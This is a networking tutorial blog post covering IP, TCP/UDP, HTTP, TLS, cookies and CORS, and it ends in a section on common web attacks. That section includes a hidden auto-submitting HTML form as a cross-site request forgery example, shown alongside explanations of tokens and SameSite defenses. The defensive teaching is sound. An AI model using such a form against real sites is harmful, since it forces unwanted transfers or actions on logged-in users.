---
title: "CS Fundamentals: Networking (Part 1)"
description: "Networking from an engineer's lens: IP, MAC, TCP/UDP, HTTP, TLS, proxies, VPN, Docker, DNS, and what really happens when you open a website, plus projects to build next."
pubDatetime: 2026-10-10T22:11:07.000+05:30 
author: Aayushmaan Soni
slug: /cs-fundamentals/networking
tags: ["networking"]
draft: false
featured: true
series:  CS Fundamentals
seriesOrder:  1
---

## Table of Contents

## Introduction
This is **Part 1** of my **CS Fundamentals** series, where I'm putting down the core CS subjects as short, to-the-point notes. They're the same notes I use myself for learning and revision, cleaned up so anyone can use them.

Each part covers the basics, but always from a **software engineer's lens**: what actually shows up when you build, deploy, and debug real systems, not just what's asked in exams.

**In this part** we start from the very basics (IP, MAC, ports, TCP/UDP), move up through HTTP, TLS, browser security, proxies, VPNs, real-time communication, P2P, Docker networking and DNS, and then tie it all together by following one request from your home router to a rendered web page. At the end, there's a list of projects to build so the concepts actually stick.

Read it top to bottom the first time; after that, use it as a quick reference.

## 1. Networking Fundamentals
- **Networking**: connecting devices so they can communicate and exchange data
- **Internet**: a huge network of interconnected networks around the world
- **Hosts**: a network-connected device with an IP address
- **Links**: path between two network devices
- **LAN (Local Area Network)**: connects devices within a small/local area
- **WAN (Wide Area Network)**: connects networks across a large geographical area
- **PAN (Personal Area Network)**: connects personal devices within a very short range, typically around one person
- **ISP (Internet Service Provider)**: company that provides you access to the Internet
- **Switches**: connects multiple devices within the same LAN; forwards data to the correct device using **MAC addresses** (Layer 2)
- **Hub**: older, simpler version of a switch; sends the data to everyone
- **Routers**: connects different networks (e.g. your LAN to your ISP's network); forwards packets using **IP addresses** (Layer 3)
- **Modem**: converts signals between your network and the ISP's line (fiber/DSL/cable)
- **Home "router"**: usually router + switch + access point (+ sometimes modem) in one box
- **Access Point**: provides wireless access to an existing network
- **Wi-Fi**: wireless networking technology/protocol family (IEEE 802.11) used to connect devices to a LAN
- **Bits**: smallest unit of data; 0 or 1; represented as `b`
- **Bytes**: 8 bits; represented as `B`
  - ISP speeds are in **Mbps** (bits), downloads show **MB/s** (bytes) → 100 Mbps ≈ 12.5 MB/s
- **Default Gateway**: device your computer sends traffic to when the destination is outside its own local network, usually router
- **VLAN (Virtual LAN)**: logically divide one physical LAN/switch infrastructure into separate LANs

## 2. IP Addressing
- **IP address**: address used to identify a device/interface on a network so data can be sent to the right destination
- **IPv4**: 
  - older and most widely known version of IP 
  - 32 bits
  - Represented using Dotted decimal (`192.168.1.10`)
  - 4 octets, each of 8 bits; value range 0 - 255
  - Possible address count: 2^32 = 4,294,967,296 ≈ 4.3 billion (not enough → NAT)
- **IPv6**:
  - newer version of IP
  - 128 bits
  - Represented using Hexadecimal, colon-separated (`2001:db8::10`)
  - Possible address count: 2^128
  - **no broadcast at all**; uses multicast instead
  - uses **NDP (Neighbor Discovery Protocol)** instead of ARP
- **Public IP**: address used by your network to communicate with the Internet; ISP gives your router/network a public IP; globally unique
- **Private IP**: used inside a LAN; for communication of devices within same n/w; not routable on the Internet
  - Ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- **NAT (Network Address Translation)**: router rewrites private IP:port → its public IP:port on the way out and back on the way in; that's why all devices on your n/w appear with the same public IP
- **CGNAT (Carrier-Grade NAT)**: ISP does NAT again on top of your router; many homes share one public IP (why hosting a server from home often doesn't work)
- **Loopback (`127.0.0.1`)**: computer is talking to itself; always refers to your own machine; no router, Wi-Fi, ISP, or Internet involved
  - whole `127.0.0.0/8` range is loopback; `localhost` usually resolves to `127.0.0.1`; IPv6 loopback is `::1`
- **`0.0.0.0` vs `127.0.0.1` (binding)**:
  - app bound to `127.0.0.1` → reachable only from the same machine
  - app bound to `0.0.0.0` → listens on all interfaces; reachable from other machines too
  - common bug: app inside Docker binds to `127.0.0.1` → not reachable from host
- **Network address**: IP address = Network part + Host part; network address identifies the network itself
- **Host address**: host part identifies a particular device within that network
- **Subnetting**: deciding how much of the IP belongs to the network and how much is left for hosts
- **Subnet mask**: `255.255.255.0`; first 24 bits network part; 8 bits host part
- **CIDR**: notation tells you how many bits are used for the network part
    - `/8`: first 8 bits are the network portion
    - `/16`: first 16 bits are the network portion
    - `/24`: first 24 bits are the network portion
    - Usable hosts = 2^(32 − n) − 2
    - Example `192.168.1.0/24`:
      - `192.168.1.0` → network address (identifies whole n/w); reserved
      - `192.168.1.1` ... `192.168.1.254` → 254 usable host addresses
      - `192.168.1.255` → broadcast address (send to every device on this n/w); reserved
- **Unicast**: One to one; One sender sends data to one specific destination
- **Broadcast**: One to all; One sender sends data to all devices on the relevant local network
- **Multicast**: One to a group; One sender sends data to a specific group of interested receivers, rather than everyone
- **DHCP (Dynamic Host Configuration Protocol)**: automatically gives devices the network configuration they need (IP, Subnet mask, Default Gateway, DNS, ...)

## 3. MAC
- **MAC address**: 48-bit hardware address of a network interface (`a4:5e:60:12:34:56`); set by manufacturer; used for delivery **within a local link**
- **End-to-end (IP)**: source & destination IP stay the same for the whole journey (NAT aside); IP = final destination
- **Hop-to-hop (MAC)**: source & destination MAC only cover the current link (this device → next device); at every router the old frame is dropped and a new one is written

```
Laptop  →  Home Router  →  ISP Router  →  ...  →  Google

Hop 1: MAC Laptop → Home Router  | IP Laptop → Google
Hop 2: MAC Home Router → ISP     | IP Laptop → Google
Hop 3: MAC ISP → Next Router     | IP Laptop → Google
```

- **ARP (Address Resolution Protocol)**: broadcast in LAN asking "who has this IPv4? tell me your MAC"; the bridge between IP (where to go) and MAC (next hop)
  - For destinations outside the LAN, ARP is done for the **default gateway's** IP, not the final destination
- **NDP (Neighbor Discovery Protocol)**: IPv6 replacement for ARP; uses ICMPv6 multicast (not broadcast) to find a neighbor's MAC from its IPv6 address; also discovers routers and helps devices auto-configure their IPv6 address (SLAAC)

## 4. Ports & Sockets
- **Port**: 16-bit number (0–65535); helps the OS know which application should receive the network traffic; software concept
- **Well-known ports**: 0–1023; need root/admin to bind on Linux
- **Registered ports**: 1024–49151; used by common apps/databases
- **Ephemeral ports**: temporary port picked by the OS for the client side of a connection; server listens on a fixed port but client also needs a port to receive replies
  - Range: 49152–65535 (IANA); Linux default 32768–60999
- **Common ports**: 22 (SSH), 53 (DNS), 80 (HTTP), 443 (HTTPS), 3306 (MySQL), 5432 (Postgres), 6379 (Redis), 27017 (MongoDB)
- **Port binding**: application claiming/listening on a port; only one app can bind the same IP:port (`address already in use` error)
- **Socket**: OS-provided abstraction that lets your program communicate over a network without implementing all the low-level networking operations itself
- **5-tuple**: a connection is uniquely identified by (protocol, src IP, src port, dst IP, dst port); that's how one server port handles thousands of clients
- **TCP socket**: socket that uses TCP to communicate
- **UDP socket**: uses UDP to communicate
- **Client socket**: socket used by the application initiating communication with another application
- **Server socket**: used by an application to receive incoming connections or data
- **Socket lifecycle**:
  - Server: `socket()` -> `bind(0.0.0.0:8000)` -> `listen()` -> `accept()` (returns a new connected socket per client) -> send/recv -> `close()`
  - Client: `socket()` -> `connect(server_ip:8000)` (OS picks ephemeral port) -> send/recv -> `close()`

## 5. TCP & UDP
- **TCP**: Transmission Control Protocol; connection-oriented; reliable, ordered delivery of a stream of bytes
  - Used by: HTTP/1.1, HTTP/2, SSH, databases
- **UDP**: User Datagram Protocol; connectionless; no reliability, no ordering; sends independent messages called datagrams; low overhead
  - Used by: DNS, video calls, online games, QUIC (HTTP/3)
- **TCP 3-way handshake**: SYN (Client initiates connection) -> SYN-ACK (Server acknowledges and responds) -> ACK (Client acknowledges the response); costs 1 RTT before any data is sent
- **TCP connection termination**:
  - Graceful: FIN/ACK exchange (Client sends FIN -> Server sends ACK -> Server sends FIN -> Client sends ACK)
  - Abort: RST; connection is killed immediately (e.g. `connection reset by peer`)
- **TIME_WAIT**: side that closes first waits (~60s on Linux) before fully releasing the connection, so late packets don't mess up a new one; too many short connections → lots of TIME_WAIT sockets → reuse connections (pooling/keep-alive)
- **Sequence numbers**: help TCP track which bytes have been sent and which bytes have been received
- **Acknowledgements**: An acknowledgement tells the sender which data has been received; uses cumulative acknowledgements
- **Retransmission**: sending data again when TCP determines it may not have arrived
- **Flow control**: prevents a fast sender from overwhelming a slow receiver (receiver window)
- **Congestion control**: prevents a sender from injecting data into the network faster than the network can handle (slow start → new connections start slow)
- **Head-of-line blocking**: one lost packet blocks all data behind it until it's retransmitted, since TCP delivers in order; one reason HTTP/3 moved to QUIC over UDP
- **Nagle's algorithm**: TCP buffers small writes to send fewer packets; adds latency for small messages; disabled with `TCP_NODELAY`
- **TCP Keep-Alive**: optional mechanism for checking whether an otherwise idle TCP connection's remote peer is still reachable
  - Not the same as **HTTP keep-alive**, which means reusing one TCP connection for multiple HTTP requests

## 6. OSI Model
- **OSI (Open Systems Interconnection)**: reference model that divides network communication into 7 layers; each layer does one job and only talks to the layer above/below it
- Not implemented as-is in real life (the Internet runs on TCP/IP), but its **layer numbers are used everywhere** in engineering talk: "L2 switch", "L3 routing", "L4 vs L7 load balancer"
- Real protocols don't always fit cleanly in one layer (e.g. TLS, QUIC, ARP); use it as a mental map, not a strict rule
- 7 layers, top to bottom (mnemonic: **A**ll **P**eople **S**hould **T**ry **N**ew **D**elicious **P**izza):
    - **L7 Application**: protocols apps use to talk over the network (not the app itself); e.g. HTTP, DNS, SMTP, SSH, FTP
    - **L6 Presentation**: how data is represented so the receiver can understand it; encoding (UTF-8, JSON), compression, encryption
    - **L5 Session**: establishing, managing and ending sessions between apps; in practice usually handled by the app or TLS, rarely a separate thing
    - **L4 Transport**: app-to-app (process-to-process) delivery using ports; segmentation, reliability, flow control (depends on protocol); e.g. TCP, UDP; PDU: **segment** (TCP) / **datagram** (UDP)
    - **L3 Network**: logical addressing (IP) and routing packets between networks; e.g. IP, ICMP; PDU: **packet**; device: router
    - **L2 Data Link**: delivery on the local link (hop-to-hop); MAC addressing, framing, error detection; e.g. Ethernet, Wi-Fi; PDU: **frame**; device: switch
    - **L1 Physical**: transmitting raw bits as electrical/light/radio signals; e.g. cables, fiber, radio; PDU: **bits**; device: hub, repeater
- **Debugging by layer**: work bottom-up; cable/Wi-Fi up? (L1/L2) -> got an IP, can ping gateway? (L3) -> port open? (L4) -> app responding correctly? (L7)

## 7. TCP/IP Model
- Model the Internet actually runs on; 4 layers (some books split Link into Data Link + Physical and call it 5)
- 4 layers, top to bottom:
    - **Application** (OSI L5–L7): protocols and data formats apps use to communicate; e.g. HTTP, DNS, TLS, SSH
    - **Transport** (OSI L4): communication between app endpoints on different hosts using ports; e.g. TCP, UDP
    - **Internet** (OSI L3): IP addressing and routing packets between networks; e.g. IP, ICMP
    - **Link / Network Access** (OSI L1–L2): delivery across the local link + physical transmission; e.g. Ethernet, Wi-Fi
- **Encapsulation**: on send, each layer wraps the data from the layer above with its own header
- **Decapsulation**: on receive, each layer strips its header and passes the rest up

```
Application:  [ HTTP data ]
Transport:    [ TCP hdr (ports) | HTTP data ]                          -> segment
Internet:     [ IP hdr (IPs) | TCP hdr | HTTP data ]                   -> packet
Link:         [ Eth hdr (MACs) | IP hdr | TCP hdr | HTTP data | FCS ]  -> frame -> bits
```

- Each device only opens as many layers as it needs:
  - switch -> reads up to L2 (MAC)
  - router -> reads up to L3 (IP); rewrites L2 header every hop (hop-to-hop vs end-to-end)
  - L4 load balancer -> reads IP + port; L7 load balancer / reverse proxy -> reads HTTP (URL, headers)
  - your app -> sees only the data; OS kernel handles L2–L4

## 8. HTTP Fundamentals
- **HTTP**: Hypertext Transfer Protocol; application layer (L7) protocol that defines how clients and servers communicate through requests and responses; runs over TCP (HTTP/1.1, HTTP/2) or QUIC/UDP (HTTP/3)
- **Stateless**: each request is independent; server doesn't remember previous requests by itself; state is added on top using cookies, sessions, or tokens
- **HTTP request**: message a client sends to a server asking it to perform an operation or provide a resource; method + path + headers + optional body
- **HTTP response**: message a server sends back to the client; status code + headers + optional body

```
GET /api/users/42?include=posts HTTP/1.1
Host: api.example.com
Accept: application/json
Authorization: Bearer <token>

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 28

{"id": 42, "name": "Aayush"}
```

- **URL**: Uniform Resource Locator; identifies a resource by specifying its location and access method
  - `https://api.example.com:443/api/users/42?include=posts#profile`
  - **SCHEME** - `https`; **HOST** - `api.example.com`; **PORT** - `443` (default for https, so usually omitted; 80 for http); **PATH** - `/api/users/42`; **QUERY** - `?include=posts`; **FRAGMENT** - `#profile`
  - **Fragment is never sent to the server**; browser uses it client-side only (scroll to section, SPA routing)
- **URI**: Uniform Resource Identifier; a general identifier for a resource; the umbrella category that includes URLs and URNs
- **URN**: Uniform Resource Name; identifies a resource by a name within a defined namespace, rather than specifying its network location; e.g. `urn:isbn:9780131103627`
- **Query parameters**: key-value inputs carried in the URL after `?`; `?category=laptop&sort=price&page=2`; used for filtering, sorting, pagination; avoid putting secrets here (ends up in logs & browser history)
- **Path parameters**: variable values embedded in the URL path; `/api/users/{user_id}` - here `user_id` is path parameter; used to identify a specific resource
- **Request body**: contains data the client sends to the server (JSON, form data, files); format described by `Content-Type`
- **Response body**: contains the content returned by the server
- **Safe method**: doesn't change server state (read-only); GET, HEAD, OPTIONS
- **Idempotent method**: sending the same request once or N times leaves the server in the same state; GET, HEAD, OPTIONS, PUT, DELETE
  - Why it matters: idempotent requests are safe to **retry** on timeout/network failure; for POST use an `Idempotency-Key` header (e.g. payments) so retries don't charge twice
- **HTTP methods**
  - **GET**: retrieve data; safe & idempotent; should not change server state; cacheable; no body (by convention)
  - **POST**: create resources or trigger actions (`/orders`, `/login`, `/send-email`); not idempotent
  - **PUT**: create or fully replace a resource at a known URI; idempotent
  - **PATCH**: partially modify a resource; not guaranteed to be idempotent; "set name to Aayush" is repeatable, "increment balance by 100" is not
  - **DELETE**: remove a resource; idempotent (2nd delete may return 404, but server state is the same)
  - **HEAD**: same as GET but returns only headers, no body; safe & idempotent; e.g. check file size or if resource exists
  - **OPTIONS**: discover what methods/options the server supports for a resource; used by browsers for **CORS preflight**; safe & idempotent
  - **QUERY**: newer method; like GET (safe, idempotent, cacheable) but carries the query in the request body; useful when query is too big/complex for the URL; support is still limited
- **Status codes**
  - **1xx**: Informational; 101 (Switching Protocols - e.g. upgrade to WebSocket)
  - **2xx**: Success; 200 (OK), 201 (Created - new resource; usually with `Location` header), 202 (Accepted - job accepted for async processing), 204 (No Content - no response body)
  - **3xx**: Redirection; 301 (Moved Permanently), 302 (Found - temporary redirect), 304 (Not Modified - use your cached copy), 307/308 (temporary/permanent redirect that **keeps the method & body**; 301/302 may change POST to GET)
  - **4xx**: Client error (fix the request, retrying as-is won't help)
    - 400 (Bad Request - malformed request)
    - 401 (Unauthorized - actually means **unauthenticated**; who are you?)
    - 403 (Forbidden - authenticated but **not allowed**)
    - 404 (Not Found), 405 (Method Not Allowed), 409 (Conflict - e.g. duplicate / version conflict)
    - 415 (Unsupported Media Type - wrong `Content-Type`), 422 (Unprocessable Content - valid format but fails validation)
    - 429 (Too Many Requests - rate limited; check `Retry-After`)
  - **5xx**: Server error (often worth retrying with backoff)
    - 500 (Internal Server Error - bug/unhandled exception)
    - 502 (Bad Gateway - proxy/LB got an invalid response from the upstream server, e.g. app crashed)
    - 503 (Service Unavailable - overloaded or down for maintenance)
    - 504 (Gateway Timeout - proxy/LB didn't get a response from upstream in time, e.g. slow DB query)
- **Headers**: key-value metadata attached to an HTTP request or response; case-insensitive names; communicate content format, auth, caching, security policies
  - **Host**: which domain the request is for; lets one server/IP host many websites
  - **Content-Type**: format of the body (`application/json`, `text/html`, `multipart/form-data`)
  - **Content-Length**: size of the body in bytes
  - **Accept**: formats the client can handle
  - **Authorization**: credentials (`Bearer <token>`, `Basic ...`)
  - **User-Agent**: identifies the client (browser, curl, app)
  - **Cookie / Set-Cookie**: client sends cookies / server sets cookies
  - **Cache-Control**: caching rules (`no-store`, `max-age=3600`)
  - **ETag / If-None-Match**: version tag of a resource; client sends it back, server replies 304 if unchanged → saves bandwidth
  - **Location**: URL to redirect to (3xx) or of the newly created resource (201)
  - **Referer**: which page/URL led to the current request (yes, misspelled in the spec); controlled by `Referrer-Policy`

## 9. HTTP Versions
- **HTTP/1.0**: one request per TCP connection
  - Flow: open TCP connection (3-way handshake) -> send request -> get response -> close connection (FIN/ACK) -> repeat for the next request
  - Every request pays the handshake cost (1 RTT, +TLS handshake for HTTPS) and starts with TCP slow start again
  - A page with 50 resources (HTML, CSS, JS, images) = 50 new connections
  - Some implementations added `Connection: keep-alive` as an extension to reuse the TCP connection, but it was not the default
- **HTTP/1.1**: persistent connections by default
  - Multiple requests/responses reuse the same TCP connection; closed only when `Connection: close` is sent or it idles out
  - `Host` header made mandatory → many websites can share one IP (virtual hosting)
  - Chunked transfer encoding → server can start sending a response before knowing its full size (streaming)
  - Still **one request at a time per connection**: next request waits for the previous response
  - **Pipelining** (sending multiple requests without waiting) existed, but responses must still come back **in order**, so one slow response blocks the ones behind it → **HTTP-level head-of-line blocking**; browsers never really enabled it
  - Workaround: browsers open ~6 parallel TCP connections per host; developers used domain sharding, bundling, image sprites

```
HTTP/1.1 (one connection, in order):
  req A ──[ slow response A ]──> req B ──> res B ──> req C ──> res C
                 ^ B and C wait for A
```

- **HTTP/2**: many requests in parallel over **one** TCP connection
  - Messages are split into **binary frames**; each frame belongs to a **stream** (one request/response pair = one stream)
  - Frames from different streams are **interleaved (multiplexed)** on the same connection → responses no longer wait for each other at the HTTP level
  - Header compression (HPACK) → repeated headers like cookies & user-agent aren't resent in full on every request
  - Stream prioritization → client can hint which resources matter more (e.g. CSS before images)
  - Server push → server sends resources before client asks; rarely used well and now removed from major browsers
  - Problem: TCP delivers bytes **strictly in order**; if one TCP packet is lost, all bytes after it wait for retransmission, even those belonging to other streams → **TCP-level head-of-line blocking**; on lossy networks (mobile) this can make HTTP/2 slower than multiple HTTP/1.1 connections
  - In practice used only over HTTPS (browsers require TLS for HTTP/2)

```
HTTP/2 (one TCP connection, interleaved):
  [A1][B1][C1][A2][B2][C2] ...
  one lost TCP packet -> A, B, C all wait for it
```

- **HTTP/3**: HTTP over **QUIC** instead of TCP
  - **QUIC**: transport protocol built on top of UDP; implements reliability, ordering, loss recovery and congestion control itself, but **per stream**
  - Lost packet only stalls **its own stream**; other streams keep flowing → no TCP-level head-of-line blocking
  - **TLS 1.3 built into QUIC** → transport + encryption handshake combined; 1 RTT for a new connection, **0-RTT** for resumed connections (vs TCP + TLS: 2+ RTT)
  - **Connection migration**: connection is identified by a connection ID, not the IP:port 4-tuple → switching Wi-Fi → mobile data doesn't break the connection
  - Header compression via QPACK (HPACK adapted for out-of-order delivery)
  - Runs in user space (not OS kernel) → easier to evolve, but more CPU cost
  - Some networks/firewalls block or throttle UDP → browsers fall back to HTTP/2; server advertises HTTP/3 support via the `Alt-Svc` header or DNS `HTTPS` record
- **Binary framing**: breaking HTTP messages into smaller pieces called frames and encoding them in binary instead of plain text; faster and less error-prone to parse
- **Streams**: independent, logical, bidirectional sequence of frames within one HTTP/2 or HTTP/3 connection; each has its own ID
- **Multiplexing**: interleaving frames from multiple streams over the same connection, so many requests are in flight at once
- **Head-of-line blocking**: first item in the queue blocks everything behind it
  - HTTP/1.1 → at HTTP level (responses must be in order)
  - HTTP/2 → fixed at HTTP level, but still exists at TCP level
  - HTTP/3 → fixed at both levels (per-stream ordering in QUIC)
- **Header compression**: HTTP/2 uses HPACK, HTTP/3 uses QPACK; both sides keep a table of headers already seen, so a repeated header is sent as a small index into that table instead of the full text

## 10. HTTPS & TLS
- **HTTPS**: HTTP + TLS (Transport Layer Security); HTTP messages are sent inside an encrypted TLS connection; default port 443
- **TLS gives 3 guarantees**:
  - **Confidentiality**: nobody in between (Wi-Fi owner, ISP) can read the data
  - **Integrity**: nobody can modify the data in transit without being detected
  - **Authentication**: you are really talking to `example.com`, not an attacker pretending to be it
  - (not the same as the security "CIA triad", where A = Availability)
- **What HTTPS hides vs not**:
  - Hidden: URL path, query params, headers, cookies, body
  - Visible: your IP & server IP, port, domain name (via DNS lookup & SNI), amount and timing of data
- **SSL**: old name/predecessor of TLS; all SSL versions are broken & deprecated; people still say "SSL certificate" but it's TLS today; use TLS 1.2 or 1.3

### Crypto building blocks
- **Encryption**: converts readable data (plaintext) into unreadable data (ciphertext) using an algorithm and a key; reversible with the right key
- **Symmetric encryption**: same secret key to encrypt and decrypt; fast; used for the actual data in TLS (AES-GCM, ChaCha20)
  - Problem: how do two strangers agree on a secret key over a network everyone can see?
- **Asymmetric encryption**: key pair; **public key** (share with everyone) + **private key** (keep secret); what one key locks, only the other can unlock; slow, so used only during the handshake
- **Hashing**: data -> fixed-length digest (SHA-256); one-way, not reversible; same input always gives same output; tiny change in input -> completely different hash; used for integrity checks
- **Digital signature**: hash the data and sign it with the **private key**; anyone with the **public key** can verify that (1) the owner of the private key signed it and (2) the data wasn't changed
- **Key exchange (Diffie-Hellman / ECDHE)**: lets two sides create the **same shared secret** over a public channel without ever sending the secret itself
  - Each side generates a temporary (ephemeral) key pair and sends only the public part ("key share")
  - Each side combines its own private part + other side's public part -> both get the same secret; an eavesdropper who sees both public parts can't compute it
  - **Forward secrecy**: keys are ephemeral (new per connection), so even if the server's private key leaks later, old recorded traffic can't be decrypted
- **How TLS combines them**:
  - Key exchange (ECDHE) -> agree on a shared secret
  - Certificate + signature (asymmetric) -> prove the server's identity
  - Symmetric encryption -> encrypt the actual data (fast)
  - Old TLS (RSA key exchange) had the client encrypt a secret with the server's public key; removed in TLS 1.3 because it has no forward secrecy

### Certificates
- **Digital certificate**: document that binds an identity (domain name) to a public key, signed by a CA; contains:
  - Domain name(s) in the **Subject Alternative Name (SAN)** field (e.g. `api.example.com`, `*.example.com`)
  - Server's public key
  - Validity dates (not before / not after)
  - Issuer (which CA signed it)
  - CA's digital signature
- **Certificate Authority (CA)**: entity trusted to verify domain ownership and issue/sign certificates; e.g. Let's Encrypt (free, automated), DigiCert
- **Chain of trust**:
  - **Root CA**: certificate pre-installed in your OS/browser **trust store**; self-signed; its private key is kept offline
  - **Intermediate CA**: signed by root; actually signs website certificates (so the root key stays safe)
  - **Leaf certificate**: your site's certificate; signed by intermediate
  - Server sends leaf + intermediate(s); browser follows signatures up to a root it already trusts

```
Root CA (in trust store)
  └── signs → Intermediate CA
                └── signs → api.example.com (leaf)
```

- **Certificate validation**: browser checks the received certificate before trusting it
  - **Hostname**: domain you typed matches a name in SAN
  - **Validity period**: not expired, not used before its start date
  - **Trust chain**: chain leads to a trusted root
  - **Signatures**: each certificate's signature is valid with the issuer's public key
  - **Usage & constraints**: certificate is allowed to be used for a TLS server
  - **Revocation**: certificate hasn't been cancelled (e.g. key leaked) via CRL/OCSP; short-lived certificates reduce the need for this

### TLS 1.3 handshake (step by step)
- **Goal**: before sending any HTTP data, agree on encryption keys + verify the server is who it claims to be
- **Step 0 - TCP handshake**: SYN -> SYN-ACK -> ACK (TLS runs on top of TCP)
- **Step 1 - ClientHello** (client -> server, plaintext):
  - Supported TLS versions & cipher suites
  - Random value (client random)
  - **Key share**: client's ephemeral ECDHE public key (it guesses which algorithm the server will pick)
  - **SNI (Server Name Indication)**: domain name it wants (`api.example.com`), so a server hosting many sites knows which certificate to send
  - **ALPN**: application protocols it supports (`h2`, `http/1.1`); this is where the HTTP version gets decided
- **Step 2 - ServerHello** (server -> client, plaintext):
  - Chosen TLS version & cipher suite
  - Server random
  - **Key share**: server's ephemeral ECDHE public key
  - Now **both sides compute the same shared secret** (ECDHE) and derive handshake keys from it; **everything after this is encrypted**
- **Step 3 - Server proves identity** (encrypted):
  - **EncryptedExtensions**: other settings (e.g. chosen ALPN protocol)
  - **Certificate**: leaf + intermediate certificates
  - **CertificateVerify**: signature over the whole handshake so far, made with the certificate's **private key**
    - Proves the server actually owns the certificate (certificates are public; anyone can copy and send one, but only the real owner can sign with its private key)
    - Also proves the key share came from the real server → stops man-in-the-middle
  - **Finished**: HMAC (keyed hash, not the MAC address) over the whole handshake → proves nothing was tampered with
- **Step 4 - Client verifies** (encrypted):
  - Validates the certificate chain (see Certificate validation) & checks CertificateVerify signature with the certificate's public key
  - Sends its own **Finished**
  - Can send the first HTTP request right along with it
- **Step 5 - Application data**: both sides derive final **traffic keys**; HTTP requests/responses are encrypted with fast symmetric encryption (AES-GCM / ChaCha20)

```
Client                                         Server
  |--- SYN / SYN-ACK / ACK (TCP) ---------------|   1 RTT
  |--- ClientHello (key share, SNI, ALPN) ----->|
  |<-- ServerHello (key share) -----------------|
  |<-- {Certificate, CertificateVerify,         |   1 RTT
  |     Finished} ------------------------------|
  |--- {Finished} + {HTTP request} ------------>|
  |<-- {HTTP response} -------------------------|
                         {...} = encrypted
```

- **Cost**: TLS 1.3 = 1 RTT (+1 RTT for TCP); TLS 1.2 = 2 RTT (+1 RTT for TCP); HTTP/3 (QUIC) merges transport + TLS into 1 RTT total
- **Session resumption**: server gives client a ticket (PSK - pre-shared key); next connection skips the certificate part
- **0-RTT**: on resumption, client can send data in its very first message; faster but that data can be **replayed** by an attacker → only use for safe/idempotent requests (GET)

### HSTS & engineer notes
- **HSTS (HTTP Strict Transport Security)**: response header telling the browser "only ever use HTTPS for this site"; browser auto-upgrades `http://` and doesn't let users click through cert errors
  - `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
  - First visit is still unprotected (header not seen yet) → **HSTS preload list** built into browsers fixes this
- **mTLS (mutual TLS)**: client also presents a certificate; server verifies client; used for service-to-service auth (service mesh, internal APIs)
- **Certificate renewal**: certificates expire (Let's Encrypt: 90 days, and the industry is moving to even shorter lifetimes); automate renewal (certbot, cert-manager in K8s); expired certificates are a very common cause of outages
- **Common errors**:
  - Expired certificate
  - Hostname mismatch (cert for `example.com`, request to `api.example.com`)
  - Missing intermediate certificate (works in browser, fails in curl/apps)
  - Self-signed certificate (fine locally; never disable verification in prod code)
- **Debug**: `openssl s_client -connect example.com:443 -servername example.com` (see certificate chain); `curl -v https://example.com` (see TLS version, cipher, certificate)

## 11. Browser Networking & Security
- **Origin**: Scheme (protocol) + Host (domain) + Port; all three must match to be same-origin; `https://example.com` vs `https://api.example.com` → different origins
- **Site**: Scheme + registrable domain (`example.com`); `app.example.com` and `api.example.com` are same-site but cross-origin; SameSite cookies use **site**, CORS uses **origin**
- **Same-Origin Policy**: browser security rule that restricts how a page from one origin can access resources from another origin
  - Blocks JS from **reading** cross-origin responses, DOM, cookies, storage
  - Does **not** block **sending** requests (forms, `<img>`, `<script>` to other origins still go out) → that's why CSRF exists
- **Cookie**: small piece of data (~4KB) that a website asks the browser to store; browser sends it back automatically on every matching request; how a stateless HTTP server remembers you (sessions, login)
- **Set-Cookie**: HTTP response header used by a server to ask the browser to store or update a cookie; `Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/`; browser sends it back in the `Cookie` request header
- **Session cookies**: no `Expires` or `Max-Age`; browser removes it when the browsing session ends (session restore can keep it alive)
- **Persistent cookies**: has `Expires` (date) or `Max-Age` (seconds); survives browser restart until it expires
- **Domain & Path**: which hosts and URL paths receive the cookie; no `Domain` → only the exact host that set it; `Domain=example.com` → subdomains too
- **Secure**: browser sends the cookie only over HTTPS
- **HttpOnly**: JavaScript can't access the cookie (`document.cookie`); protects session cookies from being stolen via XSS
- **SameSite**: controls whether the cookie is sent on cross-site requests; main defense against CSRF
    - **Strict**: never sent cross-site; even following a link from another site arrives without it (user looks logged out)
    - **Lax**: sent only on top-level navigations with safe methods (clicking a link → GET); not on cross-site POST, fetch, iframes, images; **default** in Chromium browsers (Chrome, Edge) when not set
    - **None**: always sent cross-site; must also be `Secure`; needed for embeds/third-party widgets
- **CORS**: Cross-Origin Resource Sharing; browser-enforced mechanism that lets a server **relax** Same-Origin Policy by specifying which origins can read its responses
  - Server sends `Access-Control-Allow-Origin: http://localhost:3000`
  - Enforced only by browsers; curl, Postman, backend services ignore it
  - Protects users, not your server; not a replacement for auth
  - CORS error → fix on the **server** (allow the origin), not the frontend
- **Simple CORS requests**: sent directly without a preflight; browser then checks the response's CORS headers; if the origin isn't allowed, the request **still reached the server**, but JS can't read the response
  - Only GET, HEAD, POST with basic headers and `Content-Type` of `text/plain`, `multipart/form-data` or `application/x-www-form-urlencoded`
  - `POST` with `application/json` or an `Authorization` header → not simple → preflight
- **CORS preflight**: for non-simple requests, browser first sends an `OPTIONS` request asking "may I send this?"; actual request is sent only if the server allows it
  - Browser → `OPTIONS` + `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`
  - Server → `Access-Control-Allow-Origin`, `-Allow-Methods`, `-Allow-Headers`, `-Max-Age` (cache preflight result to skip it next time)
  - Preflight must not require auth, or it fails
- **CORS with cookies**: client sends `credentials: "include"`; server must reply `Access-Control-Allow-Credentials: true` with the **exact** origin (`*` not allowed)

## 12. Common Web Attacks
- **CSRF**: Cross-Site Request Forgery; malicious website tricks your browser into sending an unwanted request to another website where you're logged in; browser attaches that site's cookies automatically, so the request looks legit
  - Example: you're logged in to `bank.com`; you open `evil.com`, which has a hidden auto-submitting form

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>
```

  - Attacker can't **read** the response (Same-Origin Policy), but doesn't need to; the action already happened
- **CSRF tokens**: unpredictable value generated by the server per session/form; must be sent with every state-changing request (hidden input or header); server rejects the request if the token is missing or wrong
  - Works because `evil.com` can't read your page on `bank.com` (Same-Origin Policy), so it can't know the token
- **CSRF defenses**: `SameSite=Lax`/`Strict` cookies (browser doesn't send cookies on cross-site POST); CSRF tokens; check `Origin`/`Referer` header; never change state on GET
  - APIs using `Authorization: Bearer <token>` header (not cookies) aren't affected, since browsers don't attach that header automatically
